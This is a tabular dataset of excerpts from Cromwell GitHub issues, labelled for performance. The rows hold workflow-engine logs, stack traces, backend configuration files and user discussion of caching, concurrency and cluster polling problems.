Performance," 12:24:32,94] [info] BT-322 b303ae23:expanse_figures.CBL_assoc:-1:1 is eligible for call caching with read = true and write = true; [2023-03-29 12:24:32,97] [info] BT-322 b303ae23:expanse_figures.CBL_hom_SNP_assoc:-1:1 is eligible for call caching with read = true and write = true; [2023-03-29 12:35:42,07] [warn] b303ae23-e1e5-4cde-832b-70114e9efdad-BackendCacheHitCopyingActor-b303ae23:expanse_figures.CBL_hom_SNP_assoc:-1:1-20000000023 [b303ae23expanse_figures.CBL_hom_SNP_assoc:NA:1]: Unrecognized runtime attribute keys: shortTask, dx_timeout; [2023-03-29 12:35:42,07] [info] BT-322 b303ae23:expanse_figures.CBL_hom_SNP_assoc:-1:1 cache hit copying success with aggregated hashes: initial = B4BFDDD19BC42B30ED73AB035F6BF1DE, file = 93DAD89F707FA490E2A46FFAC924DFFF.; [2023-03-29 12:35:42,07] [info] b303ae23-e1e5-4cde-832b-70114e9efdad-EngineJobExecutionActor-expanse_figures.CBL_hom_SNP_assoc:NA:1 [b303ae23]: Call cache hit process had 0 total hit failures before completing successfully; [2023-03-29 12:35:42,08] [warn] b303ae23-e1e5-4cde-832b-70114e9efdad-BackendCacheHitCopyingActor-b303ae23:expanse_figures.CBL_hom_not_SNP_assoc:-1:1-20000000024 [b303ae23expanse_figures.CBL_hom_not_SNP_assoc:NA:1]: Unrecognized runtime attribute keys: shortTask, dx_timeout; [2023-03-29 12:35:42,08] [info] BT-322 b303ae23:expanse_figures.CBL_hom_not_SNP_assoc:-1:1 cache hit copying success with aggregated hashes: initial = B4BFDDD19BC42B30ED73AB035F6BF1DE, file = EA2DED52B795D0B2EA5091B00E8F7A88.; [2023-03-29 12:35:42,08] [info] b303ae23-e1e5-4cde-832b-70114e9efdad-EngineJobExecutionActor-expanse_figures.CBL_hom_not_SNP_assoc:NA:1 [b303ae23]: Call cache hit process had 0 total hit failures before completing successfully; [2023-03-29 12:35:42,13] [warn] b303ae23-e1e5-4cde-832b-70114e9efdad-BackendCacheHitCopyingActor-b303ae23:expanse_figures.CBL_assoc:-1:1-20000000025 [b303ae23expanse_figures.CBL_assoc:NA:1]: Unrecognized runtime attribute keys: shortTask, dx_timeout; [2023-03-29 13:07:47,67",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7108:1242,cache,cache,1242,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7108,1,['cache'],['cache']
Performance," 2381; 470 pool-10-t 4751; 470 pool-10-t 2381; 282 G1 4751; 282 G1 2381; 188 blaze-tic 4751; 188 blaze-tic 2381; 94 VM 4751; 94 VM 2381; 94 java 4751; 94 java 2381; 94 db-9 4751; 94 db-9 2381; 94 db-8 4751; 94 db-8 2381; 94 db-7 4751; 94 db-7 2381; 94 db-6 4751; 94 db-6 2381; 94 db-5 4751; 94 db-5 2381; 94 db 4751; 94 db-4 4751; 94 db-4 2381; 94 db-3 4751; 94 db-3 2381; 94 db-2 4751; 94 db 2381; 94 db-2 2381; 94 db-20 4751; 94 db-20 2381; 94 db-19 4751; 94 db-19 2381; 94 db-18 4751; 94 db-18 2381; 94 db-17 4751; 94 db-17 2381; 94 db-16 4751; 94 db-16 2381; 94 db-15 4751; 94 db-15 2381; 94 db-1 4751 ...; ```. this is my java command; ```{shell}; java -Xms10M -Xmx125M -Dconfig.file=SGE.conf -jar cromwell-86.jar run xxx.wdl --inputs xxx.json; ```. SGE.conf file:; ```; # Documentation:; # https://cromwell.readthedocs.io/en/stable/backends/SGE. backend {; default = SGE. providers {; SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {. # Limits the number of concurrent jobs; concurrent-job-limit = 5. # If an 'exit-code-timeout-seconds' value is specified:; # - check-alive will be run at this interval for every job; # - if a job is found to be not alive, and no RC file appears after this interval; # - Then it will be marked as Failed.; # Warning: If set, Cromwell will run 'check-alive' for every job at this interval. exit-code-timeout-seconds = 120. runtime-attributes = """"""; Int cpu = 1; Float? memory_gb; String? sge_queue = ""xxx""; String? sge_project = ""xxx""; """""". submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l num_proc="" + cpu + "",virtual_free="" + memory_gb + ""g""} \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; -binding ${""linear:"" + cpu} \; /usr/bin/env bash ${script}; """""". kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)""; }; }; }; }. call-caching {; enabled = true; invalidate-bad-cache-results = true; }. ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7571:1600,concurren,concurrent,1600,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7571,3,"['cache', 'concurren']","['cache-results', 'concurrent', 'concurrent-job-limit']"
Performance," <#m_-2379693136183385899_>; > On Sun, Oct 25, 2020 at 8:37 PM Luyu *@*.*> wrote: Hi Luyu, Thanks for; > the feedback. This is an interesting case. Normally if there is a few; > minutes gap between workflows the instances will be terminated by batch and; > the disks will be reclaimed so each workflow starts from scratch. However; > in your case there isn’t a pause in work long enough for Batch to shut down; > the instances. Also because these files are written to a mounted disk they; > are not deleted when the container terminates. I think this fix is simple; > if I add a cleanup step. I will do this ASAP. Thanks, Mark …; > <#m_-3989886626109986556_> On Sat, Oct 24, 2020 at 5:27 AM Luyu @.*>; > wrote: Hi, I have set up a Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space. I have checked Cromwell documents; > and some materials from AWS, as well as issue #4323; > <https://github.com/broadinstitute/cromwell/issues/4323> <#4323; > <https://github.com/broadinstitute/cromwell/issues/4323>> <#4323; > <https://github.com/broadinstitute/cromwell/issues/4323> <#4323; > <https://github.com/broadinstitute/cromwell/issues/4323>>>. But none of; > them works for me. Thank you in advance for any suggestions. — You are; > receiving this because you are subscribed to this thread. Reply to this; > email directly, view it on GitHub <#5974; > <https://github.com/broadinstitute/cromwell/issues/5974> <#5974; > <https://github.c",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718815965:1565,concurren,concurrently,1565,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718815965,2,['concurren'],['concurrently']
Performance," <tab>call Echo as echo {; <tab>input:; <tab>}. <tab>output {; <tab>}; }. task Echo {; <tab>input {; <tab>}. <tab>command {; <tab><tab>kill -9 $$; <tab><tab>echo test; <tab>}. <tab>output {; <tab>}; }; ```. Full stacktrace:; ```; [2018-08-29 09:25:20,10] [error] WorkflowManagerActor Workflow 1ed0e19c-fa18-4241-8f6b-0b72e181f59a failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:341); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:341); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:341); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:99); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:269); cats.effect.IO.unsafeToFuture(IO.scala:341); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:152); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(Ba",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4051:1720,concurren,concurrent,1720,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4051,1,['concurren'],['concurrent']
Performance," = ""secret_secret""; },; {; name = ""service-account""; scheme = ""service_account""; service-account-id = ""my-service-account""; pem-file = ""/path/to/file.pem""; }; ]; }. engine {; // This instructs the engine which filesystems are at its disposal to perform any IO operation that it might need.; // For instance, WDL variables declared at the Workflow level will be evaluated using the filesystems declared here.; // If you intend to be able to run workflows with this kind of declarations:; // workflow {; // String str = read_string(""gs://bucket/my-file.txt""); // }; // You will need to provide the engine with a gcs filesystem; // Note that the default filesystem (local) is always available.; //filesystems {; // gcs {; // auth = ""application-default""; // }; //}; }. backend {; default = ""Local""; providers {; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 28; run-in-background = true; runtime-attributes = ""String? docker""; submit = ""/bin/bash ${script}""; submit-docker = ""docker run --rm -v ${cwd}:${docker_cwd} -i ${docker} /bin/bash < ${script}"". // Root directory where Cromwell writes job results. This directory must be; // visible and writeable by the Cromwell process as well as the jobs that Cromwell; // launches.; root: ""cromwell-executions"". filesystems {; gcs {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""application-default""; }. local {; // Cromwell makes a link to your input files within <root>/<workflow UUID>/workflow-inputs; // The following are strategies used to make those links. They are ordered. If one fails; // The next one is tried:; //; // hard-link: attempt to create a hard-link to the file; // copy: copy the file; // soft-link: create a symbolic link to the file; //; // NOTE: soft-link will be skipped for Docker jobs; localization: [; ""soft-link"", ""hard-link"", ""copy""; ]; }; }; }; }; }; }. services {; KeyValue {; class = ""c",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1480:87945,concurren,concurrent-job-limit,87945,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1480,1,['concurren'],['concurrent-job-limit']
Performance," DB fine for a few weeks, but today had a seemingly unrelated problem and this seems to have corrupted the DB. Potentially unrelated error:; ```; akka.pattern.AskTimeoutException: Ask timed out on [Actor[akka://cromwell-system/user/cromwell-service/WorkflowStoreCoo; rdinatedAccessActor#1289452983]] after [60000 ms]. Message of type [cromwell.engine.workflow.workflowstore.WorkflowStor; eCoordinatedAccessActor$FetchStartableWorkflows]. A typical reason for `AskTimeoutException` is that the recipient acto; r didn't send a reply.; at akka.pattern.PromiseActorRef$.$anonfun$defaultOnTimeout$1(AskSupport.scala:675); at akka.pattern.PromiseActorRef$.$anonfun$apply$1(AskSupport.scala:696); at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:202); at scala.concurrent.Future$InternalCallbackExecutor$.unbatchedExecute(Future.scala:875); at scala.concurrent.BatchingExecutor.execute(BatchingExecutor.scala:113); at scala.concurrent.BatchingExecutor.execute$(BatchingExecutor.scala:107); at scala.concurrent.Future$InternalCallbackExecutor$.execute(Future.scala:873); at akka.actor.LightArrayRevolverScheduler$TaskHolder.executeTask(LightArrayRevolverScheduler.scala:334); at akka.actor.LightArrayRevolverScheduler$$anon$3.executeBucket$1(LightArrayRevolverScheduler.scala:285); at akka.actor.LightArrayRevolverScheduler$$anon$3.nextTick(LightArrayRevolverScheduler.scala:289); at akka.actor.LightArrayRevolverScheduler$$anon$3.run(LightArrayRevolverScheduler.scala:241); at java.base/java.lang.Thread.run(Thread.java:834); ```. Error that I receive now when I try to start Cromwell:. ```; 2020-05-05 15:31:33,773 INFO - dataFileCache commit start; 2020-05-05 15:33:32,400 ERROR - Failed to instantiate Cromwell System. Shutting down Cromwell.; java.sql.SQLTransientConnectionException: db - Connection is not available, request timed out after 121641ms.; at com.zaxxer.hikari.pool.HikariPool.createTimeoutException(HikariPool.java:676); at com.zaxxer.hikari.pool.HikariPool.getConnection(HikariPool.jav",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-623865649:1045,concurren,concurrent,1045,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-623865649,1,['concurren'],['concurrent']
Performance," Here is the full metadata for the failed workflow:. {; ""workflowName"": ""BamToUnmappedBams"",; ""submittedFiles"": {; ""inputs"": ""{\""BamToUnmappedBams.input_bam\"":\""gs://fc-4c1c7765-2de2-4214-ac41-dc10bbcbb55b/batch04/S64-2_Illumina.bam\""}"",; ""workflow"": ""task RevertSam {\n File input_bam\n String revert_bam_name\n Int disk_size\n\n # TODO: why is SORT_ORDER=coordinate set below since we sort it again in the next step?\n # TODO: why did we need this line?\n # OUTPUT_MAP=${output_map} \\\n command {\n java -Xmx3000m -jar /usr/gitc/picard.jar \\\n RevertSam \\\n INPUT=${input_bam} \\\n OUTPUT=${revert_bam_name} \\\n VALIDATION_STRINGENCY=LENIENT \\\n ATTRIBUTE_TO_CLEAR=FT \\\n ATTRIBUTE_TO_CLEAR=XS \\\n SORT_ORDER=queryname \\\n MAX_RECORDS_IN_RAM=1000000 \n }\n runtime {\n docker: \""broadinstitute/genomes-in-the-cloud:2.2.3-1469027018\""\n disks: \""local-disk \"" + disk_size + \"" HDD\""\n memory: \""3500 MB\""\n }\n output {\n File unmapped_bam = \""${revert_bam_name}\""\n }\n}\n\ntask SortSam {\n File input_bam\n String sorted_bam_name\n Int disk_size\n\n # TODO: why not use samtools sort as it is multi-threaded?\n command {\n java -Xmx3000m -jar /usr/gitc/picard.jar \\\n SortSam \\\n INPUT=${input_bam} \\\n OUTPUT=${sorted_bam_name} \\\n SORT_ORDER=queryname \\\n MAX_RECORDS_IN_RAM=1000000\n }\n runtime {\n docker: \""broadinstitute/genomes-in-the-cloud:2.2.3-1469027018\""\n disks: \""local-disk \"" + disk_size + \"" HDD\""\n memory: \""3500 MB\""\n }\n output {\n File sorted_bam = \""${sorted_bam_name}\""\n }\n}\n\ntask ValidateSamFile {\n File input_bam\n String report_filename\n Int disk_size\n\n command {\n java -Xmx3000m -jar /usr/gitc/picard.jar \\\n ValidateSamFile \\\n INPUT=${input_bam} \\\n OUTPUT=${report_filename} \\\n MODE=VERBOSE \\\n IS_BISULFITE_SEQUENCED=false \n }\n runtime {\n docker: \""broadinstitute/genomes-in-the-cloud:2.2.3-1469027018\""\n disks: \""local-disk \"" + disk_size + \"" HDD\""\n memory: \""3500 MB\""\n }\n output {\n File report = \""${report_filename}\""\n }\",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1886:1594,multi-thread,multi-threaded,1594,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1886,1,['multi-thread'],['multi-threaded']
Performance," I see what you mean but it's the only way. When in SGE your job is killed he never get to the point of $? > rc; > so cromwell can not detect is a job is killed, meaning it will end in a endless loop polling for rc what never will come anymore; > in this case a drmaa connection would be better; > but not so sure if that still works on a start of a server; > I think there it's bound to a session; > ; > Peter van 't Hof @ffinfo Aug 26 19:11; > but only have seen the dmraa implementation inside Gatk Queue; > ; > Peter van 't Hof @ffinfo Aug 26 19:28; > when using qstat i would use it only once for the complete pool instead executing it for each job; > so then you get an output like this:; > `; > job-ID prior name user state submit/start at queue slots ja-task-ID; > 9923549 0.00000 cromwell_1 pjvan_thof qw 08/26/2016 17:23:16 1; > 9923550 0.00000 cromwell_1 pjvan_thof qw 08/26/2016 17:23:16 1; > `; > this is only 2 jobs but having a lot of jobs this will reduce the load a lot; > ; > kshakir @kshakir Aug 26 21:21; > True, Cromwell will end up in an endless loop if someone terminates the SGE job, or if the rc file doesn’t appear in general. One could use isAlive intermittently, but it was introduced mainly for recovering jobs at re-startup, & I would not have isAlive poll as often as we check for the rc file. Btw, GATK Queue actually only checks drmaa every 30 seconds, so that it doesn’t overload dispatchers. Something like isAlive could be checked with similar frequency. All this is a bigger discussion that could be tracked in a git issue.; > Separately, I am hearing from multiple people that the rc poll logs are spam. ; > ; > Peter van 't Hof @ffinfo Aug 26 21:44; > As already suggested in the PR, a actor pool would be better I think but that's not a small change indeed; > mostly jobs are running way longer that 10 or 30 sec does not matter a lot ; > ; > Peter van 't Hof @ffinfo Aug 26 21:50; > On our cluster we need something like retries but if it goes to an endless lo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-242961348:1208,load,load,1208,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-242961348,2,['load'],['load']
Performance," INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2018-06-06 16:18:47,229 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - MaterializeWorkflowDescriptorActor [UUID(948bf608)]: Parsing workflow as WDL draft-2; 2018-06-06 16:18:47,232 cromwell-system-akka.dispatchers.engine-dispatcher-32 ERROR - WorkflowManagerActor Workflow 948bf608-f91b-46a7-b892-86454be067fd failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.di",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736:2162,concurren,concurrent,2162,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736,1,['concurren'],['concurrent']
Performance," INFO - WorkflowExecutionActor-efe9c9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Starting drs_usa_jdr.read_drs_with_usa, drs_usa_jdr.localize_jdr_drs_with_usa, drs_usa_jdr.skip_localize_jdr_drs_with_usa; 2020-10-13 18:57:58,653 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.skip_localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,654 cromwell-system-akka.dispatchers.backend-dispatcher-81 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.backend-dispatcher-63 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:57:58,747 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.read_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.read_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,881 cromwell-system-akka.dispatchers.backend-dispatcher-83 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:58:01,299 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:1663,cache,cache,1663,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335,1,['cache'],['cache']
Performance," On Sun, Oct 25, 2020 at 8:37 PM Luyu <notifications@github.com> wrote:. > Hi Luyu, Thanks for the feedback. This is an interesting case. Normally if; > there is a few minutes gap between workflows the instances will be; > terminated by batch and the disks will be reclaimed so each workflow starts; > from scratch. However in your case there isn’t a pause in work long enough; > for Batch to shut down the instances. Also because these files are written; > to a mounted disk they are not deleted when the container terminates. I; > think this fix is simple if I add a cleanup step. I will do this ASAP.; > Thanks, Mark; > … <#m_-3989886626109986556_>; > On Sat, Oct 24, 2020 at 5:27 AM Luyu *@*.***> wrote: Hi, I have set up a; > Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space. I have checked Cromwell documents; > and some materials from AWS, as well as issue #4323; > <https://github.com/broadinstitute/cromwell/issues/4323> <#4323; > <https://github.com/broadinstitute/cromwell/issues/4323>>. But none of; > them works for me. Thank you in advance for any suggestions. — You are; > receiving this because you are subscribed to this thread. Reply to this; > email directly, view it on GitHub <#5974; > <https://github.com/broadinstitute/cromwell/issues/5974>>, or unsubscribe; > https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA; > .; >; > Hi Mark,; >; > Thanks for your reply.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718299843:1104,concurren,concurrently,1104,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718299843,2,['concurren'],['concurrently']
Performance," RejectedExecutionException: ); > 2020-11-07 17:54:51,635 cromwell-system-akka.dispatchers.engine-dispatcher-35 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Invalidating cache entry CallCachingEntryId(347) (Cache entry details: Some(7b292def-1477-4450-988a-e01627d61786:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0)); > 2020-11-07 17:54:51,673 cromwell-system-akka.dispatchers.backend-dispatcher-7385 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-BackendCacheHitCopyingActor-0123c178:GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:-1:1-5 [UUID(0123c178)GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1]: Unrecognized runtime attribute keys: preemptible; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-38 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1 [UUID(0123c178)]: Call cache hit process had 0 total hit failures before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Ge",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:1480,cache,cache,1480,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807,1,['cache'],['cache']
Performance," String addressee; command {; echo ""Hello ${addressee}! Welcome to Cromwell . . . on Google Cloud!""; }; output {; String message = read_string(stdout()); }; runtime {; docker: ""ubuntu:latest""; }; }. workflow wf_hello {; call hello. output {; hello.message; }; }; ```. Contents of hello.inputs:; ```; {; ""wf_hello.hello.addressee"": ""World""; }; ```; Contents of cromwell.BROADexamples.v4.conf:; ```; # This is a ""default"" Cromwell example that is intended for you you to start with; # and edit for your needs. Specifically, you will be interested to customize; # the configuration based on your preferred backend (see the backends section; # below in the file). For backend-specific examples for you to copy paste here,; # please see the cromwell.backend.examples folder in the repository. The files; # there also include links to online documentation (if it exists). # This line is required. It pulls in default overrides from the embedded cromwell; # `reference.conf` (in core/src/main/resources) needed for proper performance of cromwell.; include required(classpath(""application"")). # Google configuration; google {. application-name = ""cromwell-demo"". auths = [; {; name = ""application-default""; scheme = ""application_default""; },; {; name = ""service-account""; scheme = ""service_account""; service-account-id = ""***@***.gserviceaccount.com""; json-file = ""/***/***.json""; }; ]; }. # Here is where you can define the backend providers that Cromwell understands.; # The default is a local provider.; # To add additional backend providers, you should copy paste additional backends; # of interest that you can find in the cromwell.example.backends folder; # folder at https://www.github.com/broadinstitute/cromwell; # Other backend providers include SGE, SLURM, Docker, udocker, Singularity. etc.; # Don't forget you will need to customize them for your particular use case.; backend {; # Override the default backend.; default = ""PAPIv2"". # The list of providers.; providers {; PAPIv2 {; actor-factory ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6469:9522,perform,performance,9522,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6469,1,['perform'],['performance']
Performance," Successfully released change log lock; 2019-07-21 23:34:36,224 WARN - Unrecognized configuration key(s) for Jes: filesystems.gcs.project, name-for-call-caching-purposes, slow-job-warning-time; 2019-07-21 23:34:36,976 INFO - Slf4jLogger started; 2019-07-21 23:34:37,408 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-673c553"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""failureShutdownDuration"" : ""5 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; 2019-07-21 23:34:37,771 cromwell-system-akka.actor.default-dispatcher-3 INFO - KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; 2019-07-21 23:34:37,918 cromwell-system-akka.dispatchers.service-dispatcher-14 INFO - Metadata summary refreshing every 1 second.; 2019-07-21 23:34:38,046 WARN - 'docker.hash-lookup.gcr-api-queries-per-100-seconds' is being deprecated, use 'docker.hash-lookup.gcr.throttle' instead (see reference.conf); 2019-07-21 23:34:38,160 cromwell-system-akka.dispatchers.service-dispatcher-13 INFO - WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; 2019-07-21 23:34:38,160 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - JobStoreWriterActor configured to flush with batch size 1000 and process rate 1 second.; 2019-07-21 23:34:38,594 